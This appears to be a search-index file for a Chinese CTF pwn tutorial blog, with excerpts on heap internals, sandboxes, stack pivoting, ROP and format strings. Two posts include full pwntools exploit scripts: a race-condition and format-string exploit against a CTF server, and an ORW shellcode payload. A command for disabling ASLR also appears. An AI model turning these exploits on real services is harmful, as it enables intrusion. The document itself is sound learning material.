<?xml version="1.0" encoding="utf-8" standalone="yes"?><search><entry><title>从零开始的 Pwn 之旅 - Heap 深入理解</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---heap-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  bins 结构 fastbin 结构：单向链表 用途：快速分配和释放小块内存 chunk size 范围： 通常为 0x20 ~ 0x80（包含头部，具体范围随 glibc 版本变化，部分新版本为到 0x70） size 字段实际为 chunk_size + 标志位 特点： 释放后立即进入 fastbin，不合并相邻空闲块 链表长度无限制（不是 7，7 是 tcache 的最大数目） 只支持单向链表（每个 chunk 的 fd 指向下一个 chunk） tcache 注：glibc 2.26+ 引入 tcache，属于线程本地缓存（thread cache），比 fastbin 更快
每个 size 类别最多存储 7 个 chunk 只有小于等于 0x410（1040字节）的 chunk 才会进入 tcache unsorted bin 结构：双向链表（fd/bk） 用途：存放刚释放的非 fastbin chunk（大于 fastbin 范围） 特点： 不按大小排序，先进后出（FIFO） 后续 malloc 时会根据大小转移到 smallbin 或 largebin 所有非 fastbin 的 chunk 释放时都先进入 unsorted bin smallbin 结构：双向循环链表 chunk size 范围：大于 fastbin 最大 size（通常为 0x90）到 0x400（含头部） 特点： 每个 smallbin 存储相同大小的 chunk 按大小分 bin，方便分配 释放时支持合并相邻空闲块 largebin 结构：双向循环链表 chunk size 范围：大于 0x400 特点： 按 chunk size 升序排列 支持合并相邻空闲块 概览表 bin 类型 结构 chunk size 范围 排序方式 合并策略 链表长度限制 fastbin 单向链表 ≤ 0x80（或 0x70） 无 不合并 无 tcache 单向链表 ≤ 0x410 无 不合并 7 unsorted bin 双向链表 &amp;gt; fastbin max size 无 后续合并 无 smallbin 双向链表 &amp;gt; fastbin, ≤ 0x400 按大小分组 合并 无 largebin 双向链表 &amp;gt; 0x400 按大小升序 合并 无 chunk -&amp;gt; if (size …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - 堆溢出初探</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%9D%E6%8E%A2/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html">  堆介绍 堆是动态分配内存的区域，通常用于存储在运行时需要动态分配的对象。堆内存的分配和释放由程序员控制，常见的操作包括 malloc、free 等。
当前 Linux 标准发行版使用 ptmalloc2 作为堆的实现。ptmalloc2 是 glibc 的一部分，基于 Doug Lea 的 malloc 实现。
heap 相关概念 chunk 结构 在 ptmalloc2 中，堆内存被划分为多个块（chunk）。每个 chunk 都有一个头部和一个尾部，用于存储块的大小和状态信息。chunk 的结构如下：
1 2 3 4 5 6 7 8 9 +-------------------------------+ | prev_size | size | +-------------------------------+ | fd | bk | +-------------------------------+ | fd_nextsize | bk_nextsize | +-------------------------------+ | chunk data... | +-------------------------------+ prev_size：前一个 chunk 的大小（如果存在） size：当前 chunk 的大小和状态信息（如是否被分配） size 的最低位 PREV_INUSE 表示 chunk 是否被分配（0 表示未分配，1 表示已分配） size 的第二位 IS_MMAPPED 表示 chunk 是否是 mmap 分配的（0 表示普通分配，1 表示 mmap 分配） size 的第三位 NON_MAIN_ARENA 表示 chunk 是否在主 arena 中（0 表示在主 arena，1 表示在非主 arena） fd 和 bk：双向链表指针，用于管理空闲块的链表(如果 chunk 是空闲的) fd 指向下一个空闲块 bk 指向上一个空闲块 fd_nextsize 和 bk_nextsize：用于管理按大小排序的空闲块链表(如果 chunk 是空闲的且 chunk 较大) fd_nextsize 指向下一个空闲块 bk_nextsize 指向上一个空闲块 一个已经分配的 chunk 称前两个字段称为 chunk header， …  </content></entry><entry><title>从零开始的 Pwn 之旅 - Ptrace 沙箱</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ptrace-%E6%B2%99%E7%AE%B1/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html">  前言 这类题目一般只会允许调用 Ptrace 系统调用
1 2 3 4 5 6 7 8 9 ~/P/n/smallbox ❯❯❯ seccomp-tools dump ./smallbox (.venv) [+] please input your shellcode: ls line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x15 0x00 0x01 0x00000065 if (A != ptrace) goto 0003 0002: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0003: 0x06 0x00 0x00 0x00000000 return KILL ptrace 系统调用 ptrace 是 Linux 中的一个系统调用，可以让父进程控制子进程运行，并可以检查和改变子进程的内存和寄存器状态。它通常用于调试器和沙箱环境中。
其基本原理是：
当使用了 ptrace 跟踪后，所有发送给被跟踪的子进程的信号（除了SIGKILL），都会被转发给父进程 子进程会被阻塞，这时子进程的状态就会被系统标注为 TASK_TRACED 父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行 gdb 就是使用 ptrace 实现的调试器
一个进程只能同时被一个 ptrace 跟踪
linux 默认安全机制只允许父进程 ptract attach 它自己的子进程
定义:
1 2 #include &amp;amp;lt;sys/ptrace.h&amp;amp;gt; long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); request: 指定请求的类型
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 …  </content></entry><entry><title>从零开始的 Pwn 之旅 - 条件竞争</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  前言 条件竞争通常发生在多个线程或进程同时访问共享资源时，导致程序行为不可预测。
例题 NepCtf 2025 - time 1 2 3 4 5 6 7 8 9 ~/P/n/time ❯❯❯ pwn checksec ./time (.venv) [*] &#39;/home/lhon901/Pwn/nepctf2025/time/time&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 void __fastcall __noreturn main(int a1, char **a2, char **a3) { pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF newthread[1] = __readfsqword(0x28u); setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); sub_2A31(); while ( 1 ) { while ( !(unsigned int)sub_2B0F() ) ; pthread_create(newthread, 0, start_routine, 0); } } unsigned __int64 sub_2A31() { char *argv[5]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v2; // [rsp+38h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&#34;please input your name:&#34;); __isoc99_scanf(&#34;%100s&#34;, byte_50A0); puts(&#34;I will tell you all file names in the current directory!&#34;); argv[0] = &#34;/bin/ls&#34;; argv[1] = &#34;/&#34;; argv[2] = &#34;-al&#34;; argv[3] = 0; if ( !fork() ) execve(&#34;/bin/ls&#34;, argv, 0); wait(0); puts(&#34;good luck :-)&#34;); return v2 - __readfsqword(0x28u); } __int64 sub_2B0F() { puts(&#34;input file name you want to read:&#34;); __isoc99_scanf(&#34;%s&#34;, file); if ( !strstr(file, &#34;flag&#34;) ) return 1; puts(&#34;flag is not allowed!&#34;); return 0; } unsigned __int64 __fastcall start_routine(void *a1) { unsigned int v1; // eax int i; // [rsp+4h] [rbp-46Ch] int j; // [rsp+8h] [rbp-468h] int fd; // [rsp+Ch] [rbp-464h] _BYTE v6[96]; // [rsp+10h] [rbp-460h] BYREF _BYTE v7[16]; // [rsp+70h] [rbp-400h] BYREF _BYTE buf[1000]; // [rsp+80h] [rbp-3F0h] BYREF unsigned __int64 v9; // [rsp+468h] [rbp-8h] v9 = __readfsqword(0x28u); sub_1329(v6); v1 = strlen(file); sub_1379(v6, file, v1); sub_14CB(v6, v7); puts(&#34;I will tell you last file name content in md5:&#34;); for ( i = 0; i &lt;= 15; ++i ) printf(&#34;%02X&#34;, (unsigned __int8)v7[i]); putchar(10); for ( j = 0; j &lt;= 999; ++j ) buf[j] = 0; fd = open(file, 0); if ( fd &gt;= 0 ) { read(fd, buf, 0x3E8u); close(fd); printf(&#34;hello &#34;); printf(byte_50A0); puts(&#34; ,your file read done!&#34;); } else { puts(&#34;file not found!&#34;); } return v9 - __readfsqword(0x28u); } 程序只有这一个非栈上格式化字符串漏洞
1 printf(byte_50A0); 这里本想使用格式化字符串去修改返回地址, 但是这里经过实际调试后发现 leave ret 后的地址在 libc 区域 没有办法使得控制流重定向到一直代码段
1 2 3 4 puts(&#34;input file name you want to read:&#34;); __isoc99_scanf(&#34;%s&#34;, file); if ( !strstr(file, &#34;flag&#34;) ) return 1; 仔细观察代码发现，scanf 会把 filename 读入到 file (处于 bss 段) 中再检测
pthread_create 函数会创建多线程执行其中代码
1 2 3 4 5 6 7 8 9 fd = open(file, 0); if ( fd &gt;= 0 ) { read(fd, buf, 0x3E8u); close(fd); printf(&#34;hello &#34;); printf(byte_50A0); puts(&#34; ,your file read done!&#34;); } pthread_create 函数中的 open 函数会使用 file 作为变量
我们可以输入其他文件名先来进入 pthread_create 函数, 在主线程上在 file 里持续写入 &ldquo;flag&rdquo; 作为文件名
当 pthread_create 函数执行到 open 函数时就有可能会打开 file 中的 &ldquo;flag&rdquo; 文件
文件内容被读取到栈上，我们可以配合格式化字符串漏洞拿下 flag
payload:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * import threading context.terminal = [&#34;kitty&#34;, &#34;@&#34;, &#34;launch&#34;, &#34;--type=window&#34;] # p = process(&#34;./time&#34;) p = remote(&#34;nepctf32-2bpy-6959-ufjb-sj7njeura051.nepctf.com&#34;, 443, ssl=True) p.recvuntil(b&#34;please input your name:&#34;) payload = b&#34;%22$p-%23$p-%24$p-%25$p-%26$p-%27$p-%28$p-%29$p-%30$p&#34; p.sendline(payload) sleep(1) def work(): for _ in range(1000): try: p.sendline(b&#34;/flag&#34;) except Exception as e: continue t = threading.Thread(target=work) t.start() p.recvuntil(b&#34;input file name you want to read:&#34;) for _ in range(1000): try: p.sendline(b&#34;/hint&#34;) except Exception as e: continue # gdb.attach( # p, # gdbscript=&#34;&#34;&#34; # b *$rebase(0x2cd1) # c # &#34;&#34;&#34;, # ) # hint.txt: flag will tell you the truth about time! p.interactive() # hello 0x637b46544370654e-0x2d32396661303734-0x3062372d63613135-0x382d326236612d38-0x3636623734323763-0xa7d376164-(nil)-(nil)-(nil) ,your file read done! # flag: NepCTF{c470af92-51ac-7b08-a6b2-8c7247b66da7}   ]]></content></entry><entry><title>从零开始的 Pwn 之旅 异架构 Arm</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  Arm 汇编速探 函数调用约定 TODO: 写一片文章介绍 arm 汇编相关知识 ARM32（AArch32）调用约定 前 4 个参数：r0 ~ r3
返回值：r0
多余参数：栈上传递，从右往左入栈
堆栈平衡：被调用函数负责
函数调用：bl/b，返回用 bx lr 或 mov pc, lr
寄存器：pc（程序计数器），lr（链接寄存器，保存返回地址）
LDR 指令
LDR r0, [r1]：将 r1 指向的内存地址的值加载到 r0 LDR r0, [r1, #4]：将 r1 + 4 地址的值加载到 r0 LDR r0, [r1, r2]：将 r1 + r2 地址的值加载到 r0 ARM64（AArch64）调用约定 前 8 个参数：x0 ~ x7 返回值：x0 多余参数：依然通过栈传递，但栈对齐要求更高（16 字节对齐），参数顺序依然是从右往左入栈 堆栈平衡：被调用函数负责 函数调用：bl/bl &amp;lt;label&amp;gt;，返回用 ret 寄存器： pc（程序计数器，通常不可直接访问） lr/x30（链接寄存器，保存返回地址） 主要区别 对比项 ARM32 (AArch32) ARM64 (AArch64) 参数传递 4 个寄存器（r0~r3） 8 个寄存器（x0~x7） 返回值 r0 x0 多余参数 栈传递，右→左 栈传递，右→左，16字节对齐 返回指令 bx lr / mov pc, lr ret (等价于 ret x30) 寄存器命名 r0~r12, sp(r13), lr(r14), pc(r15) x0~x30, sp, lr(x30), pc 栈对齐 无特殊要求 16 字节对齐 例题 jarvisOJ_typo jarvisoj - typo 1 2 3 4 5 6 7 8 9 10 ~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯ pwn checksec ./typo (.venv) master ✱ ◼ [*] &amp;#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/arm/jarvisOJ_typo/typo&amp;#39; Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - ORW</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---orw/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  ORW 初识 ORW类题目是指程序开了沙箱保护，禁用了一些函数的调用（如 execve等），使得我们并不能正常 get shell，只能通过ROP的方式调用open, read, write的来读取并打印flag 内容
1 2 3 fd = open(&#39;/flag&#39;,&#39;r&#39;) read(fd,buf,len) write(1,buf,len) 查看沙箱 安装 seccomp-tools 工具
1 2 sudo apt install gcc ruby-dev gem install seccomp-tools 使用 seccomp-tools
1 seccomp-tools dump ./prog mmap 函数 一般这种ORW题目给出的溢出大小不够我们写入很长的ROP链的，因此会提供mmap()函数，从而给出一段在栈上的内存
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 void *mmap{ void *addr; //映射区首地址，传NULL size_t length; //映射区大小 //会自动调为4k的整数倍 //不能为0 //一般文件多大，length就指定多大 int prot; //映射区权限 //PROT_READ 映射区必须要有读权限 //PROT_WRITE //PROT_READ | PROT_WRITE int flags; //标志位参数 //MAP_SHARED 修改内存数据会同步到磁盘 //MAP_PRIVATE 修改内存数据不会同步到磁盘 int fd; //要映射文件所对应的文件描述符 off_t offset; //映射文件的偏移量，从文件哪个位置开始 //映射的时候文件指针的偏移量 //必须是4k的整数倍 //一般设为0 } 例题 极客大挑战 2019 Not Bad 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ~/P/b/[极客大挑战 2019]Not Bad ❯❯❯ pwn checksec ./bad (.venv) ✘ 159 [*] &#39;/home/lhon901/Pwn/buuctf/[极客大挑战 2019]Not Bad/bad&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments ~/P/b/[极客大挑战 2019]Not Bad ❯❯❯ seccomp-tools dump ./bad (.venv) line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002 if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL 64 位无任何保护
seccomp 规则只允许以下几个系统调用：
read (0) write (1) open (2) exit (60) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 __int64 __fastcall main(int a1, char **a2, char **a3) { mmap((void *)0x123000, 0x1000u, 6, 34, -1, 0); sub_400949(); sub_400906(); sub_400A16(); return 0; } int sub_400A16() { _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF puts(&#34;Easy shellcode, have fun!&#34;); read(0, buf, 0x38u); return puts(&#34;Baddd! Focu5 me! Baddd! Baddd!&#34;); } void sub_4009EE() { __asm { jmp rsp } } 注意观察 mmap 的第三个参数 6 = PROT_READ | PROT_WRITE = 可写 + 可执行
PROT_READ (1) 可读 PROT_WRITE (2) 可写 PROT_EXEC (4) 可执行 思路溢出后执行 read(0, 0x123000, 0x1000) 读取 orw shellcode 到 mmap 区域，然后执行 shellcode
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * # p = process(&#34;./bad&#34;) p = remote(&#34;node5.buuoj.cn&#34;, 29957) context.arch = &#34;amd64&#34; mmap = 0x123000 orw = shellcraft.open(&#34;./flag&#34;) orw += shellcraft.read(&#34;rax&#34;, mmap, 0x50) orw += shellcraft.write(1, mmap, 0x50) jmp_rsp = 0x400A01 payload = asm(shellcraft.read(0, mmap, 0x100)) + asm(&#34;mov rax,0x123000;call rax&#34;) payload = payload.ljust(0x28, b&#34;\x00&#34;) payload += p64(jmp_rsp) + asm(&#34;sub rsp,0x30;jmp rsp&#34;) p.sendline(payload) time.sleep(1) p.sendline(asm(orw)) p.interactive()   ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - 栈迁移</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E8%BF%81%E7%A7%BB/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html">  栈迁移初识 当我们栈溢出可用字节较少, 可以考虑进行栈迁移 程序开启了 PIE 保护机制，栈地址未知，我们可以将栈劫持到已知的地址 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用 让我们来深入了解 leave 和 ret 指令
一般在函数的结尾处，我们会看到 leave 和 ret 指令
leave 指令等价于
1 2 mov rsp, rbp pop rbp 正常情况下 leave 指令的行为
ret 指令返回到 rsp 指向的地址(栈顶)的地址
当前函数的 rbp 寄存器会存储上一层函数的 rbp, rbp+8 则存储返回地址
当我们使用 leave 指令时，实际上是将当前函数的栈帧清理掉，并将栈指针恢复到上一层函数的栈帧位置 函数的返回地址会被保留在栈中，ret 指令会将控制权转移到这个地址
可以发现，返回地址与 rbp 似乎存在一定的映射关系
1 retaddr = rbp + 8 那么我们可以通过覆盖 rbp + 使用两次 leave ret 的方式来控制程序的控制流
如图所示
例题 stackprivot 安全检查
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 ~/P/c/p/l/u/s/s/X-CTF Quals 2016 - b0verfl0w ❯❯❯ pwn checksec ./b0verfl0w (.venv) master ✱ ◼ [*] &amp;amp;#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/stackprivot/X-CTF Quals 2016 - b0verfl0w/b0verfl0w&amp;amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments …  </content></entry><entry><title>从零开始的 Pwn 之旅 - Ret2csu</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html">  前言 正常程序中是不可能有许多可利用的 gadget的，通常只有一个或几个 gadget 可以利用 ret2csu 是一个常见的 gadget，通常在使用 C++ 的程序中会有这个 gadget
程序解读 蒸米的一步一步学 ROP level5 我们重点关注 __libc_csu_init 函数
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 .text:00000000004005A0 ; =============== S U B R O U T I N E ======================================= .text:00000000004005A0 .text:00000000004005A0 .text:00000000004005A0 ; void _libc_csu_init(void) .text:00000000004005A0 public __libc_csu_init .text:00000000004005A0 __libc_csu_init proc near ; DATA XREF: _start+16↑o .text:00000000004005A0 .text:00000000004005A0 var_30 = qword ptr -30h .text:00000000004005A0 var_28 = qword ptr -28h .text:00000000004005A0 var_20 = qword ptr -20h .text:00000000004005A0 var_18 = qword ptr -18h .text:00000000004005A0 var_10 = qword ptr -10h .text:00000000004005A0 var_8 = qword ptr -8 .text:00000000004005A0 .text:00000000004005A0 ; __unwind { …  </content></entry><entry><title>从零开始的 Pwn 之旅 - 格式化字符串</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  格式化字符串初识 常见的格式化字符串函数有 printf、sprintf、fprintf、vprintf、vfprintf 等。
让我们写个简单的程序来观察观察：
1 2 3 4 5 6 #include &amp;lt;stdio.h&amp;gt; int main() { printf(&amp;#34;Coloor %s, Number %d, Float %f\n&amp;#34;, &amp;#34;Red&amp;#34;, 123456, 3.14); return 0; } 使用 gdb 动态调试
1 2 3 ► 0x555555555164 &amp;lt;main+43&amp;gt; call printf@plt &amp;lt;printf@plt&amp;gt; format: 0x555555556010 ◂— &amp;#39;Coloor %s, Number %d, Float %f\n&amp;#39; vararg: 0x555555556008 ◂— 0x646552 /* &amp;#39;Red&amp;#39; */ 当我们运行到 call printf@plt 时，可以看到 format 和 vararg 的值。
在 64 位程序中，前 6 个参数会通过寄存器传递，超过 6 个参数会通过栈传递。
1 2 3 4 5 6 7 8 #include &amp;lt;stdio.h&amp;gt; int main() { char buf[0x100]; gets(buf); printf(buf); return 0; } 1 2 3 ~/C/cpp ❯❯❯ ./print_leak AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p AAAAAAAA-0x565460f2b2a1-0x7f163f5967c0-0x7f163f5967c0-0x565460f2b2dc-0xfbad2288-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x70252d-0x40-0x800000-0xffffffffffffffff-0x140000% 可以看 …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - PIE 和 ALSR</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pie-%E5%92%8C-alsr/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  前言 PIE（Position Independent Executable）和ASLR（Address Space Layout Randomization）是现代操作系统中常用的安全机制。通过随机化程序的内存布局，PIE和ASLR可以有效地防止攻击者利用已知的内存地址进行攻击。 ALSR 安全保护等级可以使用如下命令查看:
1 2 cat /proc/sys/kernel/randomize_va_space 2 0: 禁用 ASLR。 1: 启用 ASLR，但仅对共享库和栈进行随机化。 2: 启用 ASLR，对所有内存区域（包括堆、栈和共享库）进行随机化。 若要禁用 ASLR，可以使用以下命令：
1 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 若程序启用 PIE 保护机制
程序的加载基址由操作系统决定 程序中只包含偏移地址 需要先泄露代码段基址，才能够使用程序中的 gadget PIE 下断点 使用 gdb 运行的程序默认关闭 ASLR
1 2 3 4 5 6 7 8 ~/C/cpp ❯❯❯ pwn checksec ./stack [*] &#39;/home/lhon901/Code/cpp/stack&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Stripped: No 如果程序被去符号了, 需要根据地址下断点
1 2 3 4 pwndbg&gt; start pwndbg&gt; b *$rebase(0x113d) Note: breakpoint 1 also set at pc 0x55555555513d. Breakpoint 3 at 0x55555555513d PIE 相关编译参数 -fPIE：编译器选项，用于生成位置无关的代码（Position Independent Code, PIC）。这使得生成的代码可以在任意内存地址运行。 -no-pie：链接器选项，用于禁用位置无关可执行文件（PIE）的生成。   ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - Cancary</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---cancary/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  前言 Cancary 是一种安全加固保护机制，通过对程序栈底插入一段随机的字节串，来校验当前程序是否被栈溢出
cancary 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // main.c #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; int main(int argc, char *argv[]) { return EXIT_SUCCESS; } void canary_strong() { typedef struct MyStruct { char buf[0x4]; }MyStruct; MyStruct myStruct; } void canary() { char buf[0x8]; } 编译参数：
参数 作用 推荐场景 -fno-stack-protector 关闭所有 canary 保护，不插入栈溢出检测 调试、CTF、性能极致等特殊场景 -fstack-protector 只保护含有缓冲区（如数组、结构体）的函数，插入 canary 检查（最基本的保护） 兼顾性能和基本安全 -fstack-protector-strong 保护更多类型的函数（如含有数组、结构体、指针等） 推荐日常开发和生产环境 -fstack-protector-all 对所有函数都加入 canary 检查，安全性最高，但性能开销最大 极高安全需求的场景 -fstack-protector 会对含有缓冲区的函数（如数组、结构体）插入 canary 检查，防止栈溢出攻击。如果数组小于 0x8, 是不会被保护的
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 000000000000114b &amp;lt;canary_strong&amp;gt;: 114b: 55 push rbp 114c: 48 89 e5 mov rbp,rsp 114f: 90 nop 1150: 5d pop rbp 1151: c3 ret 0000000000001152 &amp;lt;canary&amp;gt;: 1152: 55 push rbp 1153: 48 89 e5 mov rbp,rsp 1156: 48 83 ec 10 …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - Ret2libc</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html">  前言 ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)
函数调用约定和函数传参 当使用 ida pro 逆向分析时，函数开头总有这么一段：
1 int __fastcall main(int argc, const char **argv, const char **envp) __fastcall 是函数调用约定的一种，表示函数参数通过寄存器传递而不是通过栈。具体来说，前三个参数通过 rdi 和 rsi 和 rdx 寄存器传递, 前六个参数通过寄存器传递，后面的参数通过栈传递。
32 位程序通过栈传参
延迟绑定 相关调试用到的程序 ret2libc1 当使用 pwn checksec 检测二进制文件时
1 2 3 4 5 6 7 8 9 pwn checksec ./ret2libc1 (.venv) ✘ 130 master ✱ ◼ [*] &amp;amp;#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1&amp;amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No Debuginfo: Yes RELRO: Partial RELRO 表示启用了延迟绑定 (Lazy Binding)，即函数的地址在第一次调用时才会被解析并填入 GOT 表中。 RELRO: Full RELRO 表示启用了全局重定位 (Full RELRO)，即函数的地址在程序加载时就会被解析并填入 GOT 表中。 RELRO: No RELRO 表示没有启用延迟绑定。 在第一节中，我们曾经讨论了动态链接和静态链接。动态链接为了节省储存空间采用运行时装载 libc 库
程序中 .got 段记录了 libc 库中函数的地址，如果攻击者修改了 got 地址，攻击者就可以控制程序流了。为此，relro 防护机制应运而生。
但是因为计算机底层的限制，RELRO 机制沦为 🤡 机制
RELRO: …  </content></entry><entry><title>从零开始的 Pwn 之旅 - Ret2syscall</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2syscall/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  前言 ret2syscall 是 Pwn 进阶中的一个重要概念，它允许我们通过修改返回地址来直接调用系统调用，从而实现更复杂的攻击。本文将介绍 ret2syscall 的基本原理和应用。
C 语言中的 puts read write 等函数实际上是对系统调用的封装。通过 ret2syscall，我们可以直接调用这些系统调用，而不需要依赖 libc 函数。
ret2syscall ret2syscall 安全检查:
